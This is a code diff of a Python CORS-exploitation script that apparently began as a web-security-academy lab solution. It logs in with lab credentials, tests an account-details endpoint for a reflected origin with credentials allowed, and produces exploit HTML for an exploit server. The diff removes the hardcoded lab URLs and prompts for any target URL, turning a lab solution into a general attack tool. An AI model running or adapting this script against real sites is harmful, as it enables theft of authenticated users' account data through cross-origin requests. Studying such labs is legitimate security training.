@@ -1,76 +1,51 @@
 import requests
 from bs4 import BeautifulSoup
 
-def login_and_get_session(login_url, username, password):
+def login_and_get_session(base_url, username, password):
+    possible_login_paths = ['/login', '/user/login', '/signin', '/account/login']
     session = requests.Session()
     
-    # Get the login page first to capture hidden form fields (like CSRF tokens)
-    login_page = session.get(login_url)
-    if login_page.status_code != 200:
-        print(f"[!] Failed to load login page, status code: {login_page.status_code}")
+    # Try different login paths
+    for login_path in possible_login_paths:
+        login_url = base_url.rstrip('/') + login_path
+        login_page = session.get(login_url)
+        if login_page.status_code == 200:
+            break
+    else:
         return None
 
     soup = BeautifulSoup(login_page.content, 'html.parser')
-
-    # Find the login form and extract hidden input fields
     login_form = soup.find('form')
     if not login_form:
-        print("[!] Login form not found")
         return None
 
-    form_data = {}
-    for input_tag in login_form.find_all('input'):
-        if input_tag.get('name'):
-            form_data[input_tag['name']] = input_tag.get('value', '')
+    form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in login_form.find_all('input') if input_tag.get('name')}
 
-    print(f"[DEBUG] Form data before adding credentials: {form_data}")
+    form_data.update({'username': username, 'password': password})
 
-    # Update the form data with username and password
-    form_data.update({
-        'username': username,
-        'password': password
-    })
-
-    print(f"[DEBUG] Form data after adding credentials: {form_data}")
-
-    # Submit the login form
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
+    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
     response = session.post(login_url, data=form_data, headers=headers, allow_redirects=True)
+
     if response.status_code == 200 and 'session' in session.cookies:
-        print("[+] Logged in successfully")
         return session
     else:
-        print(f"[!] Login failed, status code: {response.status_code}")
-        print(f"[DEBUG] Response content: {response.content}")
         return None
 
 def check_cors_vulnerability(session, url, evil_origin):
-    headers = {
-        'Origin': evil_origin,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-    }
+    headers = {'Origin': evil_origin, 'User-Agent': 'Mozilla/5.0'}
     try:
         response = session.get(url, headers=headers)
         cors_origin = response.headers.get('Access-Control-Allow-Origin')
         cors_credentials = response.headers.get('Access-Control-Allow-Credentials')
 
-        print(f"[DEBUG] Response Headers: {response.headers}")
-
         if cors_origin and cors_credentials:
             if cors_origin == evil_origin and cors_credentials == 'true':
-                print(f"[+] Vulnerable to CORS: {url}")
                 return True
             else:
-                print(f"[-] Reflecting but not vulnerable: {url}")
                 return False
         else:
-            print(f"[-] No CORS headers present: {url}")
             return False
     except requests.RequestException as e:
-        print(f"[!] Error: {e}")
         return False
 
 def exploit_cors_vulnerability(lab_url, exploit_server_url):
@@ -87,17 +62,33 @@ def exploit_cors_vulnerability(lab_url, exploit_server_url):
         }};
     </script>
     """
-    print("[+] Use the following HTML to exploit the vulnerability:")
-    print(exploit_html)
+    return exploit_html
 
-if __name__ == "__main__":
-    login_url = "https://0a94009a044462e681ba4dc500d20093.web-security-academy.net/login"
-    target_url = "https://0a94009a044462e681ba4dc500d20093.web-security-academy.net/accountDetails"
-    evil_origin = "https://example.com"  # Using the example origin as per lab instructions
-    exploit_server_url = "https://exploit-0a8900e80444620281c94cd9013700c5.exploit-server.net"
+def check_and_exploit_cors(base_url):
     username = "wiener"
     password = "peter"
+    evil_origin = "https://example.com"
+    exploit_server_url = "https://exploit-server.net"
 
-    session = login_and_get_session(login_url, username, password)
-    if session and check_cors_vulnerability(session, target_url, evil_origin):
-        exploit_cors_vulnerability(target_url, exploit_server_url)
+    session = login_and_get_session(base_url, username, password)
+    results = []
+
+    if session:
+        account_details_url = base_url.rstrip('/') + '/accountDetails'
+        cors_vulnerable = check_cors_vulnerability(session, account_details_url, evil_origin)
+        results.append(f"CORS Vulnerability Check: {'Vulnerable' if cors_vulnerable else 'Not Vulnerable'}")
+
+        if cors_vulnerable:
+            exploit_html = exploit_cors_vulnerability(base_url, exploit_server_url)
+            results.append("Exploit HTML generated:")
+            results.append(exploit_html)
+    else:
+        results.append("Login failed. Cannot perform further checks.")
+
+    return results
+
+if __name__ == "__main__":
+    target_url = input('Enter the URL to test for CORS vulnerability: ')
+    results = check_and_exploit_cors(target_url)
+    for result in results:
+        print(result)
